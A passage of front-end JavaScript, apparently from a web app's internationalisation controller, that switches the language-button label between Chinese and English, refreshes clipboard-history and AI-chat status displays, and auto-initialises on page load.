    const langSwitchBtn = document.getElementById('lang-switch-btn');
    if (langSwitchBtn) {
      langSwitchBtn.innerHTML = lang === 'zh-CN' ? '🌐 English' : '🌐 中文';
    }

    // 重新渲染剪贴板历史列表与 AI 连接状态的文案
    if (typeof ClipboardController !== 'undefined' && ClipboardController.renderHistory) {
      ClipboardController.renderHistory();
    }
    if (typeof AiChatController !== 'undefined' && AiChatController.checkApiStatus) {
      AiChatController.checkApiStatus();
    }
  }
};

window.I18nController = I18nController;

// Auto-initialize i18n on DOM ready across all pages
if (typeof document !== "undefined") {
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => I18nController.init());
  } else {
    I18nController.init();
  }
}
